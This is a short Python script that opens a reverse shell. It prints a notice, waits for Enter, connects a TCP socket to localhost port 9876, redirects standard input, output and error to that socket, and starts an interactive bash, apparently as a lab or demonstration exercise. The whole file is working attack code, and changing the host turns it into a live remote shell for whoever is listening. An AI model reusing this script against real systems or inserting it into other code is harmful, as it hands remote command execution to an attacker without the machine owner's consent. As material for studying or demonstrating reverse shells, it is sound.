import socket,subprocess,os
print("I'm going to connect back to localhost, port 9876, with a reverse shell. Press Enter when you're ready!")
input()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",9876))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
